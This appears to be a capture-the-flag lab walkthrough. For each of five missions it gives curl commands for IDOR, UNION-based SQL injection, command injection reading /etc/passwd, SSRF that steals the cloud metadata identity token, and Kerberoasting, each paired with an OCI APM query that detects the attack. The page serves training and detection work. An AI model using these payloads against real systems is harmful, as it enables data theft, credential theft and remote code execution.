CTF Walkthrough Guide

Step-by-Step

Follow these guides to exploit each vulnerability. Each walkthrough shows the attack technique, curl commands, expected output, and how to find the attack in OCI APM.

High Mission 1: IDOR — Insecure Direct Object Reference

▼
1

Understand the target

The application has an orders API that returns order details by ID. Your order is #1001, but order #1002 belongs to another user.

2

Access your own order (normal behavior)

curl -s http://CTF_TARGET/api/v1/ctf/orders/1001 | jq .
This returns your own order — legitimate access.
3

Change the ID to access another user's order

curl -s http://CTF_TARGET/api/v1/ctf/orders/1002 | jq .

The server returns the order without checking ownership. Look for the flag in the response.

4

Detect in OCI APM

show (spans) SpanName as Name, SpanAttribute['security.attack.type'] as AttackType where SpanAttribute['security.attack.type'] = 'idor'
In OCI APM Trace Explorer, this query finds all IDOR attacks. Each span includes the target user ID and source IP.

Critical SQL Injection — UNION-based Attack

▼
1

Test for injection

curl -s "http://CTF_TARGET/api/v1/users/search?q='"

If the server returns a SQL error, the parameter is injectable.

2

Extract data with UNION

curl -s "http://CTF_TARGET/api/v1/users/search?q=' UNION SELECT username,password FROM users--" | jq .
This dumps all usernames and password hashes from the database.
3

Detect in OCI APM

show (spans) where SpanAttribute['security.attack.type'] = 'sqli' | sort by StartTime desc
The OTel span includes the full SQL payload in security.attack.payload, the source IP, and user agent for forensics.

Critical Command Injection — Remote Code Execution

▼
1

Test for command injection

curl -s "http://CTF_TARGET/api/v1/system/diagnostics?cmd=id"

If the server returns the output of id, you have RCE.

2

Chain commands

curl -s "http://CTF_TARGET/api/v1/system/diagnostics?cmd=id;whoami;cat /etc/passwd"
The semicolon ; and pipe | characters allow chaining multiple OS commands.
3

Detect in OCI APM

show (spans) where SpanAttribute['security.attack.type'] = 'rce' | stats count by SpanAttribute['security.source_ip']
Group by source IP to identify which attacker is running OS commands. The payload attribute contains the exact commands executed.

Critical SSRF — Cloud Metadata Theft

▼
1

Target the cloud metadata endpoint

curl -s "http://CTF_TARGET/api/v1/got/dragons?url=http://169.254.169.254/opc/v2/instance/"

The IMDS endpoint at 169.254.169.254 is only accessible from within the cloud instance. SSRF lets you reach it through the application.

2

Steal instance identity

curl -s "http://CTF_TARGET/api/v1/got/dragons?url=http://169.254.169.254/opc/v2/identity/token"
On OCI, this retrieves the instance principal token — equivalent to stealing the VM's IAM credentials.
3

Detect in OCI APM

show (spans) where SpanAttribute['security.attack.type'] = 'ssrf' and SpanAttribute['security.ssrf.target_url'] like '%169.254%'
Look for SSRF spans targeting internal/metadata IPs. The security.ssrf.target_url attribute reveals what the attacker tried to reach.

GOAD Kerberoasting — Active Directory Attack

▼
1

Understand the attack

Kerberoasting requests TGS tickets for service accounts, then cracks them offline to reveal the service account password. This targets the GOAD AD lab (sevenkingdoms.local).

2

Trigger via the portal

curl -s "http://CTF_TARGET/portal/api/goad/kerberoast" -H "Authorization: Bearer <token>"

The portal sends the Kerberoast request to the GOAD domain controller and returns any captured TGS tickets.

3

Detect in OCI APM + Windows Events

show (spans) where SpanAttribute['security.attack.type'] = 'kerberoast'
APM: The OTel span records security.goad.target_domain and security.attack.mitre_id=T1558.003.
Windows: Event ID 4769 (TGS Request) with RC4 encryption type on the domain controller.
